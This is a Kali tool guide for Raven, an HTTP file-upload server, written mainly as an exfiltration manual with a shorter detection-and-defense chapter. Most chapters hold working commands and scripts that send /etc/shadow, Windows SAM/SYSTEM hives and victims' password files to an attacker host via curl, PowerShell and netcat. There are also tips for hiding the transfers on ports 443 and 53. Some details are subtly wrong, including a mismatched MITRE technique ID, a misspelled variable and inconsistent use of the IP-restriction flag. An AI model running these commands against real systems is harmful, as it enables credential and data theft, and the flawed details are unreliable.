---
tool_name: "raven"
display_name: "Raven"
mitre_tactic: "exfiltration"
mitre_tactic_id: "TA0010"
mitre_technique: "T1048.002 - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol"
mitre_technique_id: "T1048.002"
install_command: "sudo apt install raven"
version: "1.1.0"
github_repo: "https://github.com/gh0x0st/raven"
kali_tools_page: "https://www.kali.org/tools/raven/"
difficulty_level: "beginner"
requires_root: false
gui_available: false
tags: ["exfiltration", "http", "file-upload", "python", "lightweight", "ir", "incident-response"]
related_tools: ["goshs", "impacket-smbserver", "python3-http.server", "netcat"]
---

# Raven — Lightweight HTTP File Upload Server for Exfiltration

## What This Tool Does (in 30 seconds)

Raven is a minimal Python HTTP server designed specifically for receiving file uploads during penetration testing and incident response. Where `python3 -m http.server` only serves files for download, Raven fills the gap by providing a self-contained file upload endpoint. It supports IP-based access restriction, organized upload directories, and works over any network where HTTP is permitted. When SMB is blocked and you need a clean way to pull files off a target, Raven is the simplest solution available.

---

## Chapter 1: Introduction & Overview

### What is Raven?

Raven is a Python tool that extends Python's built-in `http.server` module with file upload capabilities. It was created to address a common pentest scenario: you need to receive files from a remote machine, but SMB is blocked, you don't want to set up a full web server, and you need something that works immediately with minimal configuration. Raven provides an HTTP endpoint that accepts file uploads via POST requests, with optional IP whitelisting and automatic organization of uploads by client IP.

### Key Features

- Self-contained HTTP upload server
- IP-based access restriction (`--allowed-ip`)
- Organized uploads by client IP (`--organize-uploads`)
- Custom upload directory (`--upload-dir`)
- Works on any port
- No external dependencies beyond Python 3
- Minimal footprint — single Python script
- Works with curl, PowerShell, Python requests, and browsers
- No authentication required (by design — keep it simple)
- Silent operation (no verbose output)
- Perfect for incident response file collection

### History & Background

- **Author:** gh0x0st
- **Language:** Python 3
- **License:** MIT
- **Repository:** github.com/gh0x0st/raven
- **Kali Package:** raven (version 1.1.0)
- **Purpose:** File upload server for pentesting and incident response

### When to Use Raven

- **Incident response** — Collect forensic artifacts from compromised machines
- **Pentest exfiltration** — Receive files when SMB/FTP are blocked
- **Quick file collection** — Faster than setting up a full web server
- **Multi-machine collection** — Gather files from multiple targets simultaneously
- **Lab environments** — Simple upload endpoint for testing
- **Remote support** — Let users upload files to your machine
- **Data staging** — Stage collected data before further analysis

### When NOT to Use This Tool

- Without explicit authorization from the target organization
- When encryption (TLS) is required — Raven does not support HTTPS natively
- When authentication is required — Raven has no built-in auth (use goshs instead)
- When SMB is available and preferred — Impacket SMBServer is more reliable for Windows targets
- For large-scale production file sharing — Use a proper web server

### Legal and Ethical Considerations

- Only deploy on networks you have authorization to test
- Raven listens on all interfaces by default — restrict to specific IPs when possible
- Files received may contain sensitive data — handle according to engagement rules
- HTTP traffic is unencrypted — do not use over public networks without TLS
- Document all file transfers for accountability

### Key Concepts

- **HTTP Upload:** Sending files to a server via HTTP POST requests
- **IP Whitelisting:** Restricting access to specific IP addresses
- **Incident Response:** The process of handling security breaches and collecting evidence
- **File Staging:** Collecting files in a central location before analysis
- **Multipart Form Data:** HTTP content type used for file uploads
- **Endpoint:** A network-accessible service that accepts connections

---

## Chapter 2: Installation & Setup

### System Requirements

- **OS:** Any Linux distribution with Python 3
- **Python:** 3.6 or higher
- **RAM:** 10 MB minimum
- **Disk Space:** 50 KB installed
- **Privileges:** Not required (unless using ports below 1024)
- **Dependencies:** Python 3 standard library only

### Installation Methods

#### Method 1: APT (Recommended)

```bash
sudo apt update
sudo apt install raven
```

Verify installation:

```bash
raven --help
```

#### Method 2: From pip

```bash
pip3 install raven
```

#### Method 3: From Source

```bash
git clone https://github.com/gh0x0st/raven.git
cd raven
pip3 install -r requirements.txt
python3 raven.py
```

### Verify Installation

```bash
# Check raven is available
which raven
# Output: /usr/bin/raven

# Check version
raven --help
```

### Dependencies

Raven has no external dependencies beyond Python 3's standard library. It uses:

- `http.server` — Built-in HTTP server module
- `socketserver` — Built-in socket server
- `argparse` — Command-line argument parsing
- `os` — File system operations
- `ipaddress` — IP address validation

---

## Chapter 3: Basic Usage

### Complete Flag Reference

#### Positional Arguments

| Argument | Description | Default |
|----------|-------------|---------|
| `lhost` | IP address to listen on | 0.0.0.0 (all interfaces) |
| `lport` | Port to listen on | 8080 |

#### Optional Arguments

| Flag | Long Flag | Description | Default |
|------|-----------|-------------|---------|
| `-h` | `--help` | Show help message | -- |
| | `--allowed-ip` | Restrict access to specific IP | none |
| | `--upload-dir` | Directory to save uploads | current directory |
| | `--organize-uploads` | Organize uploads into subfolders by client IP | false |

### Scenario 1: Basic Upload Server

Start a basic file upload server on port 8080:

```bash
raven 0.0.0.0 8080
```

Sample output:

```
Serving on 0.0.0.0:8080
```

Upload files from a Linux target:

```bash
curl -X POST -F "file=@/etc/passwd" http://KALI_IP:8080/
curl -X POST -F "file=@/etc/shadow" http://KALI_IP:8080/
curl -X POST -F "file=@/var/log/auth.log" http://KALI_IP:8080/
```

Upload from a Windows PowerShell target:

```powershell
Invoke-WebRequest -Uri "http://KALI_IP:8080/" -Method POST -InFile "C:\data\passwords.xlsx"
```

### Scenario 2: IP-Restricted Server

Only allow uploads from a specific IP:

```bash
raven 10.10.14.5 443 --allowed-ip 10.10.10.100
```

Sample output:

```
Serving on 10.10.14.5:443
Allowed IP: 10.10.10.100
```

If a different IP tries to connect:

```
Connection from 10.10.10.200 rejected (not in allowed list)
```

### Scenario 3: Organized Uploads

Save uploads organized by client IP:

```bash
raven 0.0.0.0 8080 --upload-dir /tmp/exfil --organize-uploads
```

Directory structure after uploads:

```
/tmp/exfil/
├── 10.10.10.100/
│   ├── passwords.xlsx
│   └── auth.log
├── 10.10.10.101/
│   ├── shadow
│   └── passwd
└── 10.10.10.102/
    └── data.zip
```

### Scenario 4: Custom Upload Directory

Save uploads to a specific directory:

```bash
raven 0.0.0.0 8080 --upload-dir /opt/ir_collection
```

### Scenario 5: Combined Options

Full-featured upload server:

```bash
raven 10.10.14.5 443 \
  --allowed-ip 10.10.10.100 \
  --upload-dir /tmp/ir_evidence \
  --organize-uploads
```

---

## Chapter 4: Intermediate Usage & Automation

### Scripting Exfiltration Workflows

#### Automated Collection with Logging

```bash
#!/bin/bash
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
UPLOAD_DIR="/tmp/exfil_${TIMESTAMP}"
LOG_FILE="/var/log/raven_${TIMESTAMP}.log"

mkdir -p "$UPLOAD_DIR"

echo "[*] Starting Raven upload server..."
echo "[*] Upload directory: $UPLOAD_DIR"
echo "[*] Log file: $LOG_FILE"

# Start Raven
raven 0.0.0.0 8080 --upload-dir "$UPLOAD_DIR" --organize-uploads &

RAVEN_PID=$!
echo "[*] Raven PID: $RAVEN_PID"

# Monitor uploads
while true; do
    FILE_COUNT=$(find "$UPLOAD_DIR" -type f | wc -l)
    TOTAL_SIZE=$(du -sh "$UPLOAD_DIR" 2>/dev/null | cut -f1)
    echo "[$(date)] Files: $FILE_COUNT | Total: $TOTAL_SIZE"
    sleep 10
done &
MONITOR_PID=$!

# Cleanup
cleanup() {
    kill $RAVEN_PID $MONITOR_PID 2>/dev/null
    echo "[*] Raven stopped."
    echo "[*] Collected files:"
    find "$UPLOAD_DIR" -type f -exec ls -lh {} \;
}
trap cleanup EXIT
wait
```

#### Multi-Target Collection Script

```bash
#!/bin/bash
# Start Raven for collecting files from multiple targets
UPLOAD_DIR="/tmp/multi_exfil"
ALLOWED_IPS="10.10.10.100,10.10.10.101,10.10.10.102"

mkdir -p "$UPLOAD_DIR"

echo "[*] Starting Raven for multi-target collection"
echo "[*] Allowed IPs: $ALLOWED_IPS"

# Note: Raven only supports single --allowed-ip
# For multiple IPs, use goshs or start multiple instances

# Start Raven (allows all IPs for this example)
raven 0.0.0.0 443 --upload-dir "$UPLOAD_DIR" --organize-uploads &

RAVEN_PID=$!

# Generate collection commands for each target
for IP in 10.10.10.100 10.10.10.101 10.10.10.102; do
    echo "[*] Collection command for $IP:"
    echo "    curl -X POST -F \"file=@/etc/passwd\" http://KALI_IP:443/"
    echo "    curl -X POST -F \"file=@/var/log/auth.log\" http://KALI_IP:443/"
done

wait $RAVEN_PID
```

#### Integration with Webhook Notifications

```bash
#!/bin/bash
UPLOAD_DIR="/tmp/exfil"
WEBHOOK_URL="https://hooks.slack.com/services/T00/B00/xxxx"

mkdir -p "$UPLOAD_DIR"

# Monitor for new files and notify
while true; do
    find "$UPLOAD_DIR" -type f -newer /tmp/.raven_last 2>/dev/null | while read file; do
        FILENAME=$(basename "$file")
        FILESIZE=$(stat -c%s "$file")
        FILEHASH=$(sha256sum "$file" | cut -d' ' -f1)

        # Send notification
        curl -X POST -H 'Content-type: application/json' \
          --data "{\"text\":\"New file received: ${FILENAME} (${FILESIZE} bytes) SHA256: ${FILEHASH}\"}" \
          "$WEBHOOK_URL"
    done
    touch /tmp/.raven_last
    sleep 5
done &
MONITOR_PID=$!

# Start Raven
raven 0.0.0.0 8080 --upload-dir "$UPLOAD_DIR" --organize-uploads

kill $MONITOR_PID 2>/dev/null
```

### Integration with Other Tools

#### Raven + Netcat for Fallback

```bash
# If Raven fails, use netcat as fallback
# On Kali (listener):
nc -lvp 9999 > received_file.bin

# On target (sender):
cat /etc/shadow | nc KALI_IP 9999
```

#### Raven + Python Requests (Programmatic Upload)

```python
#!/usr/bin/env python3
"""Upload files to Raven server programmatically."""
import requests
import os
import glob

RAVEN_URL = "http://10.10.14.5:8080/"

def upload_file(filepath):
    """Upload a single file to Raven."""
    with open(filepath, 'rb') as f:
        response = requests.post(
            RAVEN_URL,
            files={'file': (os.path.basename(filepath), f)}
        )
    return response.status_code

def upload_directory(directory):
    """Upload all files in a directory."""
    results = {}
    for filepath in glob.glob(os.path.join(directory, '*')):
        if os.path.isfile(filepath):
            status = upload_file(filepath)
            results[filepath] = status
            print(f"{'[+]' if status == 200 else '[-]'} {filepath}: {status}")
    return results

if __name__ == '__main__':
    upload_directory('/tmp/sensitive_data')
```

#### Raven + PowerShell (Windows Target)

```powershell
# PowerShell: Upload multiple files to Raven
$files = @(
    "C:\Windows\System32\config\SAM",
    "C:\Windows\System32\config\SYSTEM",
    "C:\Users\victim\Documents\passwords.xlsx"
)

foreach ($file in $files) {
    $fileName = Split-Path $file -Leaf
    $fileBytes = [System.IO.File]::ReadAllBytes($file)
    $boundary = [System.Guid]::NewGuid().ToString()

    $body = @"
--$boundary
Content-Disposition: form-data; name="file"; filename="$fileName"
Content-Type: application/octet-stream

$([System.Text.Encoding]::GetEncoding('iso-8859-1').GetString($fileBytes))
--$boundary--
"@

    Invoke-WebRequest -Uri "http://10.10.14.5:8080/" `
        -Method POST `
        -ContentType "multipart/form-data; boundary=$boundary" `
        -Body $body

    Write-Host "[+] Uploaded: $fileName"
}
```

---

## Chapter 5: Advanced Usage

### Custom Server Configuration

#### Environment Variables

While Raven doesn't support configuration files, you can wrap it in scripts:

```bash
#!/bin/bash
# raven-config.sh — Configurable Raven wrapper

# Configuration
RAVEN_HOST="${RAVEN_HOST:-0.0.0.0}"
RAVEN_PORT="${RAVEN_PORT:-8080}"
RAVEN_UPLOAD_DIR="${RAVEN_UPLOAD_DIR:-/tmp/exfil}"
RAVEN_ALLOWED_IP="${RAVEN_ALLOWED_IP:-}"
RAVEN_ORGANIZE="${RAVEN_ORGANIZE:-false}"

# Build command
CMD="raven $RAVEN_HOST $RAVEN_PORT --upload-dir $RAVEN_UPLOAD_DIR"

if [ -n "$RAVEN_ALLOWED_IP" ]; then
    CMD="$CMD --allowed-ip $RAVEN_ALLOWED_IP"
fi

if [ "$RAVEN_ORGANIZE" = "true" ]; then
    CMD="$CMD --organize-uploads"
fi

echo "[*] Starting: $CMD"
exec $CMD
```

Usage:

```bash
# Use defaults
./raven-config.sh

# Override settings
RAVEN_PORT=443 RALLOWED_IP=10.10.10.100 RAVEN_ORGANIZE=true ./raven-config.sh
```

### Covert Exfiltration Techniques

#### Over Port 443 (HTTPS Impersonation)

```bash
# Run Raven on port 443 to look like HTTPS traffic
raven 0.0.0.0 443 --upload-dir /tmp/exfil --allowed-ip 10.10.10.100
```

#### Over Non-Standard DNS Port

```bash
# Use DNS port to avoid detection
raven 0.0.0.0 53 --upload-dir /tmp/exfil
```

#### With iptables Port Redirection

```bash
# Redirect external port 443 to internal Raven on 8080
sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080

# Start Raven on 8080
raven 127.0.0.1 8080 --upload-dir /tmp/exfil
```

### Advanced Python Integration

#### Custom Upload Handler

```python
#!/usr/bin/env python3
"""
Extended Raven with custom upload handling, validation, and logging.
"""
import os
import hashlib
import json
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
import cgi

class CustomUploadHandler(BaseHTTPRequestHandler):
    upload_dir = '/tmp/exfil'
    log_file = '/var/log/raven_custom.json'

    def do_POST(self):
        """Handle file upload."""
        content_type = self.headers['Content-Type']
        if 'multipart/form-data' not in content_type:
            self.send_error(400, 'Invalid content type')
            return

        form = cgi.FieldStorage(
            fp=self.rfile,
            headers=self.headers,
            environ={
                'REQUEST_METHOD': 'POST',
                'CONTENT_TYPE': content_type,
            }
        )

        file_item = form['file']
        if file_item.filename:
            filename = os.path.basename(file_item.filename)
            filepath = os.path.join(self.upload_dir, filename)

            # Save file
            with open(filepath, 'wb') as f:
                f.write(file_item.file.read())

            # Calculate hash
            file_hash = hashlib.sha256(open(filepath, 'rb').read()).hexdigest()
            file_size = os.path.getsize(filepath)

            # Log event
            self.log_upload(filename, file_size, file_hash)

            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(f'OK: {filename} ({file_size} bytes)'.encode())
        else:
            self.send_error(400, 'No file provided')

    def log_upload(self, filename, size, hash_val):
        """Log upload to JSON file."""
        entry = {
            'timestamp': datetime.now().isoformat(),
            'filename': filename,
            'size': size,
            'sha256': hash_val,
            'client': self.client_address[0]
        }
        with open(self.log_file, 'a') as f:
            f.write(json.dumps(entry) + '\n')
        print(f"[+] Received: {filename} ({size} bytes) SHA256:{hash_val[:16]}...")

    def log_message(self, format, *args):
        """Suppress default logging."""
        pass

def main():
    server = HTTPServer(('0.0.0.0', 8080), CustomUploadHandler)
    print('[*] Custom upload server on 0.0.0.0:8080')
    server.serve_forever()

if __name__ == '__main__':
    main()
```

#### Batch Upload Script

```python
#!/usr/bin/env python3
"""Batch upload multiple directories to Raven."""
import os
import requests
import sys
from pathlib import Path

def upload_to_raven(raven_url, directory, organize=True):
    """Upload all files in directory to Raven."""
    uploaded = 0
    failed = 0

    for root, dirs, files in os.walk(directory):
        for filename in files:
            filepath = os.path.join(root, filename)
            try:
                with open(filepath, 'rb') as f:
                    response = requests.post(
                        raven_url,
                        files={'file': (filename, f)},
                        timeout=30
                    )
                if response.status_code == 200:
                    uploaded += 1
                    print(f'[+] {filename}: OK')
                else:
                    failed += 1
                    print(f'[-] {filename}: HTTP {response.status_code}')
            except Exception as e:
                failed += 1
                print(f'[-] {filename}: {e}')

    return uploaded, failed

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print(f'Usage: {sys.argv[0]} <raven_url> <directory>')
        sys.exit(1)

    url = sys.argv[1]
    directory = sys.argv[2]

    uploaded, failed = upload_to_raven(url, directory)
    print(f'\n[*] Results: {uploaded} uploaded, {failed} failed')
```

---

## Chapter 6: Real-World Scenarios

### Scenario 1: Penetration Test -- Collecting Evidence from Multiple Workstations

**Objective:** Gather forensic artifacts from 5 Windows workstations during a pentest.

**Setup:**

```bash
# Start Raven with organized uploads
raven 10.10.14.5 443 \
  --upload-dir /tmp/pentest_evidence \
  --organize-uploads
```

**On each workstation (via existing shell access):**

```cmd
:: Create collection script
echo curl -X POST -F "file=@C:\Windows\System32\config\SAM" http://10.10.14.5:443/ > collect.bat
echo curl -X POST -F "file=@C:\Windows\System32\config\SYSTEM" http://10.10.14.5:443/ >> collect.bat
echo curl -X POST -F "file=@C:\Users\victim\Documents\passwords.xlsx" http://10.10.14.5:443/ >> collect.bat
echo curl -X POST -F "file=@C:\Users\victim\Desktop\financial_report.pdf" http://10.10.14.5:443/ >> collect.bat

:: Run collection
collect.bat
```

**Post-collection:**

```bash
# Verify collected files
find /tmp/pentest_evidence -type f | wc -l
du -sh /tmp/pentest_evidence/

# Organize and analyze
ls -la /tmp/pentest_evidence/10.10.10.100/
ls -la /tmp/pentest_evidence/10.10.10.101/
```

### Scenario 2: Incident Response -- Remote Artifact Collection

**Objective:** Collect artifacts from a compromised server during IR engagement.

**Setup:**

```bash
# Start Raven on IR machine
raven 192.168.1.100 8080 \
  --upload-dir /tmp/ir_evidence \
  --organize-uploads \
  --allowed-ip 192.168.1.50
```

**On compromised server (via existing access):**

```powershell
# PowerShell: Collect and upload artifacts
$artifacts = @(
    "C:\Windows\System32\winevt\Logs\Security.evtx",
    "C:\Windows\System32\winevt\Logs\System.evtx",
    "C:\Windows\System32\winevt\Logs\Application.evtx",
    "C:\Windows\System32\config\SAM",
    "C:\Windows\System32\config\SYSTEM",
    "C:\Windows\System32\config\SECURITY",
    "C:\Windows\Temp\malware_sample.exe"
)

foreach ($artifact in $artifacts) {
    if (Test-Path $artifact) {
        $fileName = Split-Path $artifact -Leaf
        $fileBytes = [System.IO.File]::ReadAllBytes($artifact)
        $boundary = [System.Guid]::NewGuid().ToString()

        $body = @"
--$boundary
Content-Disposition: form-data; name="file"; filename="$fileName"
Content-Type: application/octet-stream

$([System.Text.Encoding]::GetEncoding('iso-8859-1').GetString($fileBytes))
--$boundary--
"@

        try {
            $response = Invoke-WebRequest -Uri "http://192.168.1.100:8080/" `
                -Method POST `
                -ContentType "multipart/form-data; boundary=$boundary" `
                -Body $body `
                -TimeoutSec 30

            Write-Host "[+] Uploaded: $fileName ($($response.StatusCode))"
        } catch {
            Write-Host "[-] Failed: $fileName ($($_.Exception.Message))"
        }
    }
}
```

### Scenario 3: Red Team -- Data Staging Over HTTP

**Objective:** Stage exfiltrated data on your infrastructure before final extraction.

**Setup:**

```bash
# Start Raven on your infrastructure
raven 203.0.113.50 443 \
  --upload-dir /tmp/staging \
  --organize-uploads \
  --allowed-ip 10.10.10.0/24
```

**From compromised host (via C2):**

```bash
# Linux: Upload sensitive files
for f in /etc/shadow /etc/passwd /var/log/auth.log; do
    curl -X POST -F "file=@$f" http://203.0.113.50:443/
    sleep 1
done

# Upload database dump
curl -X POST -F "file=@/tmp/db_dump.sql.gz" http://203.0.113.50:443/
```

**Verification:**

```bash
# Verify received files
ls -la /tmp/staging/
find /tmp/staging -type f -exec sha256sum {} \;
```

### Scenario 4: Lab Environment -- File Collection Endpoint

**Objective:** Create a file collection endpoint for a security training exercise.

```bash
# Start Raven for training lab
raven 0.0.0.0 8080 \
  --upload-dir /tmp/training_submissions \
  --organize-uploads

# Provide students with upload command:
# curl -X POST -F "file=@your_results.txt" http://KALI_IP:8080/
```

### Scenario 5: Covert Exfiltration via HTTPS Port

**Objective:** Exfiltrate data using port 443 to blend with normal HTTPS traffic.

```bash
# Start Raven on 443
raven 0.0.0.0 443 \
  --upload-dir /tmp/covert_exfil \
  --allowed-ip 10.10.10.100

# From target (looks like HTTPS traffic in logs)
curl -k -X POST -F "file=@/etc/shadow" https://KALI_IP:443/
```

---

## Chapter 7: Detection & Defense

### Detection Signatures

#### Snort/Suricata Rules

```
# Detect Raven HTTP upload
alert http any any -> $HOME_NET any (
    msg:"HTTP File Upload Detected (Potential Exfiltration)";
    flow:to_server,established;
    content:"POST";
    http_method;
    content:"multipart/form-data";
    http_header;
    content:"filename=";
    http_client_body;
    threshold:type both, track by_src, count 10, seconds 60;
    sid:1000020;
    rev:1;
)

# Detect large HTTP uploads
alert http any any -> $HOME_NET any (
    msg:"Large HTTP Upload Detected";
    flow:to_server,established;
    content:"POST";
    http_method;
    content:"Content-Length:";
    http_header;
    pcre:"/Content-Length:\s*(\d{7,})/Hi";
    sid:1000021;
    rev:1;
)

# Detect HTTP upload on non-standard port
alert http any any -> $HOME_NET 443 (
    msg:"HTTP Upload on Port 443";
    flow:to_server,established;
    content:"POST";
    http_method;
    content:"multipart/form-data";
    http_header;
    sid:1000022;
    rev:1;
)
```

#### YARA Rules

```
rule raven_upload_server {
    meta:
        description = "Detects Raven upload server traffic"
        author = "Security Team"
    strings:
        $raven1 = "raven" ascii
        $raven2 = "multipart/form-data" ascii
        $raven3 = "file" ascii
    condition:
        $raven1 and $raven2 and $raven3
}

rule http_file_exfiltration {
    meta:
        description = "Detects HTTP-based file exfiltration patterns"
    strings:
        $post = "POST" ascii
        $upload = "multipart/form-data" ascii
        $filename = "filename=" ascii
    condition:
        $post and $upload and $filename
}
```

### Log Analysis

```bash
# Monitor for HTTP uploads
tcpdump -i any port 8080 -A | grep -E "POST|multipart"

# Check for large transfers
netstat -an | grep -E "ESTABLISHED.*8080"

# Analyze HTTP access logs
tail -f /var/log/apache2/access.log | grep POST
```

### Defensive Measures

1. **Network monitoring** — Alert on HTTP POST requests to unusual ports
2. **Proxy inspection** — Inspect HTTP uploads for sensitive data patterns
3. **Data Loss Prevention (DLP)** — Deploy DLP solutions to detect file uploads
4. **Endpoint monitoring** — Monitor for curl/PowerShell upload commands
5. **Firewall rules** — Block outbound HTTP to unauthorized servers
6. **TLS inspection** — Decrypt and inspect HTTPS traffic for exfiltration
7. **User training** — Educate users about unauthorized file transfers

---

## Chapter 8: Troubleshooting

### Common Issues and Solutions

#### Port Already in Use

```bash
# Error: [Errno 98] Address already in use
sudo lsof -i :8080
sudo kill <PID>

# Or use a different port
raven 0.0.0.0 9090
```

#### Permission Denied on Port

```bash
# Ports below 1024 require root
sudo raven 0.0.0.0 80

# Or use a higher port
raven 0.0.0.0 8080
```

#### Connection Refused

```bash
# Check if Raven is running
ps aux | grep raven

# Check if port is listening
ss -tlnp | grep 8080

# Check firewall
sudo iptables -L -n | grep 8080
sudo ufw status
```

#### Upload Fails Silently

```bash
# Check disk space
df -h /tmp

# Check directory permissions
ls -la /tmp/exfil/
chmod 777 /tmp/exfil/

# Check file size limits
ulimit -f
```

#### Client Can't Connect

```bash
# Test connectivity from target
curl -v http://KALI_IP:8080/

# Check if IP is allowed
raven 0.0.0.0 8080 --allowed-ip 10.10.10.100

# Check network routing
ping KALI_IP
traceroute KALI_IP
```

### Debugging

```bash
# Test Raven locally
curl -X POST -F "file=@/etc/passwd" http://127.0.0.1:8080/

# Check Raven process
ps aux | grep raven

# Monitor network connections
ss -tlnp | grep 8080
netstat -an | grep 8080

# Capture traffic
sudo tcpdump -i any port 8080 -w /tmp/raven_traffic.pcap
```

---

## Resources

### Official Documentation

- **Raven GitHub:** https://github.com/gh0x0st/raven
- **Kali Tools Page:** https://www.kali.org/tools/raven/
- **Python http.server Docs:** https://docs.python.org/3/library/http.server.html

### Related MITRE ATT&CK Techniques

- **T1048.002** -- Exfiltration Over Asymmetric Encrypted Non-C2 Protocol
- **T1048.003** -- Exfiltration Over Unencrypted Non-C2 Protocol
- **T1041** -- Exfiltration Over C2 Channel
- **T1567** -- Exfiltration Over Web Service

### Related Tools

- **goshs** — Multi-protocol file server with SMB, FTP, and WebDAV
- **impacket-smbserver** — Python SMB server with NTLM capture
- **python3 -m http.server** — Built-in HTTP file server (download only)
- **netcat** — TCP/UDP connection utility for simple transfers
- **socat** — Multipurpose relay for advanced connections

### Books and References

- "The Hacker Playbook 3" -- Practical penetration testing techniques
- "Incident Response & Computer Forensics" by Jason Luttgens
- "Penetration Testing" by Georgia Weidman
- MITRE ATT&CK Framework: https://attack.mitre.org/

---

*Last updated: 2026-07-20*
*Raven version: 1.1.0*
*Kali Linux version: 2026.x*
